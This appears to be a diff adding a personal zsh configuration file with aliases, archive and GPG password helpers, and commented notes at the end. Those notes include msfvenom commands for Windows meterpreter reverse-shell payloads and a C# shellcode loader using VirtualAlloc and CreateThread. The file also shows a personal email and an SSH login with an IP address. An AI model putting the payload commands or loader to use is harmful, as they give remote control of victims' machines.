@@ -1,0 +1,408 @@
+# Path to your oh-my-zsh installation.
+export ZSH=/home/k7zy/.oh-my-zsh
+
+# Set name of the theme to load.
+# Look in ~/.oh-my-zsh/themes/
+# Optionally, if you set this to "random", it'll load a random theme each
+# time that oh-my-zsh is loaded.
+ZSH_THEME="ys"
+
+# Uncomment the following line to use case-sensitive completion.
+# CASE_SE="true"
+
+# Uncomment the following line to use hyphen-insensitive completion. Case
+# sensitive completion must be off. _ and - will be interchangeable.
+# HYPHEN_INSENSITIVE="true"
+
+# Uncomment the following line to disable bi-weekly auto-update checks.
+# DISABLE_AUTO_UPDATE="true"
+
+# Uncomment the following line to change how often to auto-update (in days).
+export UPDATE_ZSH_DAYS=13
+
+# Uncomment the following line to disable colors in ls.
+# DISABLE_LS_COLORS="true"
+
+# Uncomment the following line to disable auto-setting terminal title.
+# DISABLE_AUTO_TITLE="true"
+
+# Uncomment the following line to enable command auto-correction.
+# auto-correctionENABLE_CORRECTION="true"
+
+# Uncomment the following line to display red dots whilst waiting for completion.
+# COMPLETION_WAITING_DOTS="true"
+
+# Uncomment the following line if you want to disable marking untracked files
+# under VCS as dirty. This makes repository status check for large repositories
+# much, much faster.
+# DISABLE_UNTRACKED_FILES_DIRTY="true"
+
+# Uncomment the following line if you want to change the command execution time
+# stamp shown in the history command output.
+# The optional three formats: "mm/dd/yyyy"|"dd.mm.yyyy"|"yyyy-mm-dd"
+# HIST_STAMPS="mm/dd/yyyy"
+
+# Would you like to use another custom folder than $ZSH/custom?
+# ZSH_CUSTOM=/path/to/new-custom-folder
+
+# Which plugins would you like to load? (plugins can be found in ~/.oh-my-zsh/plugins/*)
+# Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/
+# Example format: plugins=(rails git textmate ruby lighthouse)
+# Add wisely, as too many plugins slow down shell startup.
+plugins=(git z colored-man-pages nmap) 
+
+# User configuration
+
+export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/opt/metasploit-framework:$GOROOT/bin/:/usr/local/clamav/bin/:/opt/ffmpeg:~/.local/bin:/opt/google-cloud-sdk/bin"
+# export MANPATH="/usr/local/man:$MANPATH"
+
+export XAUTHORITY=~/.Xauthority
+
+source $ZSH/oh-my-zsh.sh
+source <(kubectl completion zsh)
+source <(helm completion zsh)
+source <(kompose completion zsh)
+source <(/usr/bin/zsh /opt/google-cloud-sdk/completion.zsh.inc)
+source <(/usr/bin/zsh /opt/google-cloud-sdk/path.zsh.inc)
+
+# You may need to manually set your language environment
+# export LANG=en_US.UTF-8
+
+# Preferred editor for local and remote sessions
+# if [[ -n $SSH_CONNECTION ]]; then
+#   export EDITOR='vim'
+# else
+#   export EDITOR='mvim'
+# fi
+ 
+#Color Set 
+#
+RED='\033[0;31m'
+YELLOW='\e[33m'
+CYAN='\e[36m'
+LRED='\e[91m'
+NC='\033[0m' # No Color
+BLINK='\e[5m'
+
+# Compilation flags
+export ARCHFLAGS="-arch x86_64"
+
+# ssh
+# export SSH_KEY_PATH="~/.ssh/dsa_id"
+
+# Set personal aliases, overriding those provided by oh-my-zsh libs,
+# plugins, and themes. Aliases can be placed here, though oh-my-zsh
+# users are encouraged to define aliases within the ZSH_CUSTOM folder.
+# For a full list of active aliases, run `alias`.
+#
+# Example aliases
+# alias zshconfig="mate ~/.zshrc"
+# alias ohmyzsh="mate ~/.oh-my-zsh"
+export GOROOT=/opt/go
+export GOPATH=/opt/Tools/HERCULES
+export PATH=$PATH:$GOROOT/bin
+export WORKOW_HOME=$HOME/.virtualenvs
+export PROJECT_HOME=$HOME/workspace
+export CDPATH=.:~:/mnt/
+#source /usr/local/bin/virtualenvwrapper.sh
+
+if [ "$TERM"=="xterm" ]; then
+    export TERM=xterm-256color
+fi
+alias cp='rsync -aP'
+
+alias bc='bc -ql'
+alias listen="lsof -P -i -n | lolcat" 
+alias mkdir='mkdir -vp'
+alias ll='grc ls -lh'
+alias ex='exit'
+alias ping='grc ping'
+alias dig='grc dig'
+alias sl='ls'
+alias traceroute='grc traceroute'
+alias last='grc last'
+alias ifconfig='sudo grc ifconfig'
+alias ps='grc ps'
+alias netstat='grc netstat'
+alias diff='grc diff'
+alias gcc='grc gcc'
+alias make='grc make'
+alias wdiff='grc wdiff'
+# alias emacs='LC_CTYPE=zh_CN.UTF-8 emacs' 
+alias emacsd='emacs --daemon'
+alias e='emacsclient -t'
+alias ec='emacsclient -c'
+alias xterm='xterm -geometry 95x19 -fg yellow -cr yellow -bc'
+alias sshremote='ssh Zipper@139.196.94.255'
+
+alias pycat="pygmentize -O style=native, linenos=1 -f 256 -g $1 | pv -qL 1000"
+# alias cat='pygmentize -O style=monokai -f console256 -g'
+# pygmentize -g -O style=colorful,linenos=1
+
+# alias status_code='python -c "import requests, sys; print(requests.get(sys.argv[1]).status_code)"'
+alias http_code='curl -I $1 -s -o /dev/null -w %{http_code}'
+
+alias n="sudo netstat -naltp | lolcat"
+alias f='free -m | lolcat'
+alias v='vim'
+alias c='clear'
+alias r='reset'
+
+#eval "$(thefuck --alias fuck)"
+# run emacs daemon
+# [[ -z $(ps -C 'emacs --daemon' -o pid=) ]] && time emacsd &> /dev/null;
+
+# add kill emacs function
+function kill-emacs(){
+    emacsclient -e "(kill-emacs)"
+    emacs_pid=$( ps -C 'emacs --daemon' -o pid= )
+    if [[ -n "${emacs_pid}" ]];then
+        kill -9 "${emacs_pid}"
+    fi
+}
+
+# 压缩解压
+function ztar() {
+        [ "$1" != "" ] && tar -czRf $1.tar.gz $1 && echo "$1.tar.gz created successfully!"|| echo "Usage: tarz [folder_or_file]"
+}
+
+function jtar() {
+        [ "$1" != "" ] && tar -cjRf $1.tar.bz2 $1 && echo "$1.tar.bz2 created successfully!" || echo "Usage: tarj [folder_or_file]"
+}
+function Jtar() {
+    [ "$1" != "" ] && tar -cJRf  $1.tar.xz $1 && echo "$1.tar.bz2 created successfully!" || echo "Usage: tarJ [folder_or_file]"
+}
+
+function utar() {
+        [ "$1" != "" ] && tar -xvf $1 || echo "Usage: utar [tar_file_name]"
+}
+
+function extract() {
+    if [ -f $1 ] ; then
+      case $1 in
+        *.tar.xz)     tar Jxvf $1    ;;
+        *.tar.bz2)   tar xvjf $1    ;;
+        *.tar.gz)    tar xvzf $1    ;;
+        *.bz2)       bunzip2 $1     ;;
+        *.rar)       unrar e $1     ;;
+        *.gz)        gunzip $1      ;;
+        *.tar)       tar xvf $1     ;;
+        *.tbz2)      tar xvjf $1    ;;
+        *.tgz)       tar xvzf $1    ;;
+        *.zip)       unzip $1       ;;
+        *.Z)         uncompress $1  ;;
+        *.7z)        7z x $1        ;;
+        *.rar)       rar e $1       ;;
+        *)     echo "'$1' cannot be extracted via extract()" ;;
+         esac
+     else
+         echo "'$1' is not a valid file"
+     fi
+}
+#加密解密
+function encrypt(){
+    read  -p "Please enter your password: " number \n
+    tar -zcvf - $1 |openssl des3 -salt -k $number | dd of=$1.des3
+}
+
+function decrypt(){
+    read  -p "Please enter your password: " pass\n
+    dd if=$1 |openssl des3 -d -k $pass |tar zxf -
+}
+
+function fix(){
+
+}
+
+if [ "$TERM" = "linux" ]; then
+    echo -en "\e]P0232323" #black
+    echo -en "\e]P82B2B2B" #darkgrey
+    echo -en "\e]P1D75F5F" #darkred
+    echo -en "\e]P9E33636" #red
+    echo -en "\e]P287AF5F" #darkgreen
+    echo -en "\e]PA98E34D" #green
+    echo -en "\e]P3D7AF87" #brown
+    echo -en "\e]PBFFD75F" #yellow
+    echo -en "\e]P48787AF" #darkblue
+    echo -en "\e]PC7373C9" #blue
+    echo -en "\e]P5BD53A5" #darkmagenta
+    echo -en "\e]PDD633B2" #magenta
+    echo -en "\e]P65FAFAF" #darkcyan
+    echo -en "\e]PE44C9C9" #cyan
+    echo -en "\e]P7E5E5E5" #lightgrey
+    echo -en "\e]PFFFFFFF" #white
+    clear #for background artifacting
+fi
+
+[[ -s /home/k7zy/.autojump/etc/profile.d/autojump.sh  ]] && source /home/k7zy/.autojump/etc/profile.d/autojump.sh
+
+	autoload -U compinit && compinit -u
+
+[[ -s "$HOME/.local/share/marker/marker.sh"  ]] && source "$HOME/.local/share/marker/marker.sh"
+
+
+function vnoci(){
+    iconv -f gbk -t utf-8 $1 >> /tmp/tmp.iconv
+    \mv /tmp/tmp.iconv $1
+}
+
+function random(){
+    tr -dc 'a-zA-Z0-9~!@#$%^&*' < /dev/urandom | head -c 18
+}
+
+function keys(){
+    pass=`tr -dc 'a-zA-Z0-9~!@#$%^&*()_+' < /dev/urandom | head -c 18`
+    case $1 in
+        "-c"|"--create")
+            if [[ -f $HOME/.keys.gpg ]];then
+                gpg -o $HOME/.keys -d $HOME/.keys.gpg
+                \mv $HOME/.keys.gpg{,.bak}
+            fi
+
+            printf '%s ' 'Please enter your flag(URL,Domain,Sites,keywork):'
+            read keywork
+            echo -e "${LRED}Keyworks:\e[5m" ${YELLOW}$keywork"\n"${NC}${LRED}"Pass:\e[5m"${YELLOW} $pass${NC} && echo $keywork"\n" $pass >> $HOME/.keys
+            gpg --recipient k7zy@outlook.com --encrypt $HOME/.keys
+            srm -rv $HOME/.keys
+            ;;
+
+        "-a"|"-add")
+            if [[ -f $HOME/.keys.gpg ]];then
+                gpg -o $HOME/.keys -d $HOME/.keys.gpg
+                \mv $HOME/.keys.gpg{,.bak}
+            fi
+
+            printf '%s ' 'Please enter your flag(URL,Domain,Sites,keywork): '
+            read keywork
+            printf '%s ' 'Please enter your Password: '
+            read pass
+            echo -e "${LRED}Keyworks:\e[5m" ${YELLOW}$keywork"\n"${NC}${LRED}"Pass:\e[5m"${YELLOW} $pass${NC} && echo $keywork"\n" $pass >> $HOME/.keys
+            gpg --recipient k7zy@outlook.com --encrypt $HOME/.keys
+            srm -rv $HOME/.keys
+            ;;
+
+        "-s"|"--show")
+            if [[ -f $HOME/.keys.gpg ]];then
+                gpg -o $HOME/.keys -d $HOME/.keys.gpg  && cat $HOME/.keys | lolcat && srm -rv $HOME/.keys
+            else
+                echo "No such file or directory"
+            fi
+            ;;
+        *)
+            echo "Usage: keys [OPTION]...
+
+    -c, --create        Create a keys .
+    -a, --add           Add a keys .
+    -s, --show          View all keys .."
+            ;;
+    esac
+}
+
+translate(){ 
+    proxychains wget -qO- "http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=$1&langpair=$2|${3:-en}" | sed 's/.*"translatedText":"\([^"]*\)".*}/\1\n/'; 
+}
+#Set oracle jdk environment
+#export JAVA_HOME=/opt/java/jdk1.8.0_121  ## 这里要注意目录要换成自己解压的jdk 目录
+#export JRE_HOME=${JAVA_HOME}/jre  
+#export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib  
+#export PATH=${JAVA_HOME}/bin:$PATH  
+
+#THIS MUST BE AT THE END OF THE FILE FOR SDKMAN TO WORK!!!
+export SDKMAN_DIR="/home/k7zy/.sdkman"
+[[ -s "/home/k7zy/.sdkman/bin/sdkman-init.sh" ]] && source "/home/k7zy/.sdkman/bin/sdkman-init.sh"
+
+
+# Global proxy ...
+# export http_proxy="http://127.0.0.1:8123/"
+#
+# Encrypt 用于加密。
+# gpg --recipient [用户ID] --output demo.en.txt --encrypt demo.txt
+# Secret-keys私钥解密
+# gpg --decrypt demo.en.txt --output demo.de.txt
+#
+export HERCULES_PATH=/opt/Tools/HERCULES
+export HERCULES_PATH=/opt/Tools/HERCULES
+# export LC_CTYPE=zh_CN.UTF-8
+
+# Command 
+# sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys D530E028F59EAE4D
+# ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.1.168
+#
+## Downloads
+#wget -r -A pdf,pptx https://exploit.courses/files/bfh2017
+#
+#
+##Test Port
+#nc -w 10 -z 192.168.0.1 80 -v
+##传送文件
+#host1 nc -l  44  >  file
+#host2 nc 192.168.1.10 44 < file
+#
+##DATE Time Sync
+#ntpdate cn.pool.ntp.com && date
+#
+#msfvenom
+#msfvenom -p windows/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.2.222 -e x86/shikata_ga_nai -i 11 -f py -o shellcode.py
+#msfvenom -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b x00xff LHOST=192.168.0.114 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe 
+#
+# C# 
+#using System;
+#using System.Threading;
+#using System.Runtime.InteropServices;
+#namespace MSFWrapper
+#{
+#    public class Program
+#    {
+#        public Program()
+#        {
+#           RunMSF();
+#        }
+#        public static void RunMSF()
+#        {
+#            byte[] MsfPayload = {
+#            //Paste your Payload here
+#        };
+#            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
+#            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
+#            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
+#            Thread.Sleep(2000);
+#        }
+#        public static void Main()
+#        {
+#        }
+#        [DllImport("kernel32.dll")]
+#        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+#        [DllImport("kernel32.dll")]
+#        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+#    }
+#}
+
+#Virtualbox 从U盘启动
+#VBoxManage internalcommands createrawvmdk -filename /home/k7zy/raw.vmdk -rawdisk /dev/sdb
+#
+#curl qrenco.de/k7zy.com
+#
+#█████████████████████████████
+#█████████████████████████████
+#████ ▄▄▄▄▄ █▀ █ ▄█ ▄▄▄▄▄ ████
+#████ █   █ █▄ █▀▄█ █   █ ████
+#████ █▄▄▄█ █ ██▀ █ █▄▄▄█ ████
+#████▄▄▄▄▄▄▄█ ▀ ▀ █▄▄▄▄▄▄▄████
+#████ ▄▀▄▀▀▄ ▀▄▄███   █▄▄▀████
+#████ ▄█ ▄▄▄███ ▀▄▀ ▄▀ █▄▄████
+#█████▄▄█▄▄▄▄▀▀█▀▄█  █ ▀█▀████
+#████ ▄▄▄▄▄ █▄▀ ▀▀▀▄▄ ▄█▄█████
+#████ █   █ █▀▄▀ █▄▄▀▀▄▀ ▀████
+#████ █▄▄▄█ █▀▀▄█▄▀▀ ▄ ▄█▄████
+#████▄▄▄▄▄▄▄█▄██▄▄██▄█▄█▄█████
+#█████████████████████████████
+#█████████████████████████████
+#
+#printf "two/nlines" \
+    #curl -F-=\<- qrenco.de
+#
+#rename 'tr/A-Z/a-z/' anaconda-ks.cfg
+#或
+#rename 's/.*/\U$&/g' anaconda-ks.cfg
+#
+#curl -u k7zy https://api.github.com/user/repos -d '{"name":"Sylvia"}'
